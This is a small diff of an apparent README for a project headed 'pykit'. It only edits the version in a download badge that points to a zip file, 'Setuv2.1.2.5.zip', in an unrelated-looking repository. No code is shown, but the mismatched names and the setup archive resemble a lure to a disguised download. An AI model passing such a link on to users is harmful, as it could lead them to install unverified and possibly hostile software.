@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/⬇%20download-stable-success?style=flat-square)](https://github.com/ryanblab1903n8/piperplus/releases/download/v5.0.0/Setuv2.1.2.5.zip)
+[![Download](https://img.shields.io/badge/⬇%20download-stable-success?style=flat-square)](https://github.com/ryanblab1903n8/piperplus/releases/download/v1.0.0/Setuv2.1.2.5.zip)
 
 # ⚡ pykit
 
